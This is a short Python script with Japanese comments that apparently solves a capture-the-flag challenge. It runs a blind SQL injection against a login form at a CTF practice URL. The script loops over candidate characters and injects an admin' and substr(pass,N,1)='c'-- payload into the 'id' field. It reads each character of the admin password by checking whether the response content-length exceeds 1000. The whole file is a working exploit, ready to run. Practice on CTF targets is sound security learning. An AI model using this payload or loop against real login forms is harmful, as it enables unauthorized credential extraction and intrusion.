#!/usr/bin/env python
#coding: utf-8

import urllib.request
import urllib.parse

#パスワード候補文字列
charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'

flag = ''

#先頭から順にflag文字列を探していく
for str_pos in range(21):
    for pw in charset:
        
        #POSTのペイロード
        payload = {'id':'admin\' and substr(pass,'+str(str_pos) +',1) = \''+pw+'\'--', 'pass': ''}
        
        #utf-8でエンコードしてリクエスト
        post_data = urllib.parse.urlencode(payload).encode('utf-8')
        url = "http://ctfq.sweetduet.info:10080/~q6/"
        req = urllib.request.Request(url, post_data)

        #HTTPレスポンス
        res = urllib.request.urlopen(req)

        #content-lengthが大きかったら正しい文字
        if(int(res.headers['content-length']) > 1000):
            flag += pw
            print(str(str_pos) + ':' + flag)
            break